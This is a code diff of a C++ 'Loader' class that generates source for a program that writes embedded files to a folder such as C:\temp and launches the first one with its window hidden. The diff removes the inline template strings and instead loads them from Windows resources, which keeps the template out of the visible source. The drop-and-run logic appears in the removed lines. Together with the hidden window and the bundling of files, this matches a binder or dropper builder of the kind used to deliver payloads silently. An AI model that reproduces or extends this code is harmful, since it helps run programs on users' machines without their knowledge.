@@ -1,48 +1,5 @@
 #include "loader.h"
 
-Loader::Loader() noexcept
-	:outputDelay(DELAY_OUTPUT_LONG),
-	bufferLoaded(false),
-	runPath("C:\\temp"),
-	outputBuffer("")
-{
-	// Loader code sections
-	loader_impl_0 = {
-	"#include <string>\n"
-	"#include <vector>\n"
-	"#include <filesystem>\n"
-	"#include <fstream>\n"
-	"#include <windows.h>\n"
-	"#include \"data.h\"\n"
-	"\n"
-	"int main()\n"
-	"{\n"
-		"\tstd::string path;\n"
-		"\tstd::vector<std::string> fileNames;\n"
-		"\tstd::vector<unsigned char*> data;\n"
-		"\tstd::vector<uint64_t> sizes;\n"
-		"\tstd::ofstream outFile;\n"
-		"\n"
-	};
-
-	loader_impl_1 = {
-			"\tfor (unsigned int i = 0; i < data.size(); ++i)\n"
-			"\t{\n"
-				"\t\toutFile.open(path + \"\\\\\" + fileNames[i], std::ios::out | std::ios::binary);\n"
-				"\t\toutFile.write(reinterpret_cast<const char*>(data[i]), sizes[i]);\n"
-				"\t\toutFile.close();\n"
-			"\t}\n"
-			"\n"
-			"\tpath.append(\"\\\\\" + fileNames[0]);\n"
-			"\tSTARTUPINFOA si{ 0 };\n"
-			"\tPROCESS_INFORMATION pi{ 0 };\n"
-			"\tsi.wShowWindow = SW_HIDE;\n"
-			"\tCreateProcessA(path.c_str(), NULL, NULL, NULL, false, 0, NULL, NULL, &si, &pi);\n"
-			"\n"
-			"\treturn 0;\n"
-		"}\n"
-	};
-}
 void Loader::SetPath(PATH_TYPE type, const std::string& path) noexcept
 {
 	switch (type)
@@ -444,7 +401,7 @@ unsigned int Loader::BuildImplFile() noexcept
 			return FAILURE_CONTINUE;
 		}
 
-		outFile << loader_impl_0;
+		outFile << GetResourceData(LOADER_DATA_0);
 
 		// Write variables
 		outFile << "\tpath = R\"(" << runPath << ")\";\n\n";
@@ -465,7 +422,7 @@ unsigned int Loader::BuildImplFile() noexcept
 		outFile << "\n";
 
 		// Write remaining instructions and close file
-		outFile << loader_impl_1;
+		outFile << GetResourceData(LOADER_DATA_1);
 		outFile.close();
 	}
 	catch (std::exception& e)
@@ -533,4 +490,25 @@ unsigned int Loader::CleanUp() noexcept
 	}
 
 	return FAILURE_CONTINUE;
+}
+
+HMODULE GetModule()
+{
+	HMODULE hModule = NULL;
+	GetModuleHandleEx(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS,
+		(LPCTSTR)GetModule,
+		&hModule);
+
+	return hModule;
+}
+std::string GetResourceData(unsigned int arg)
+{
+	std::string result;
+	HRSRC hRes = FindResource(GetModule(), MAKEINTRESOURCE(arg), MAKEINTRESOURCE(TEXTFILE));
+	HGLOBAL hData = LoadResource(GetModule(), hRes);
+	DWORD hSize = SizeofResource(GetModule(), hRes);
+	char* hFinal = (char*)LockResource(hData);
+	result.assign(hFinal, hSize);
+
+	return result;
 }
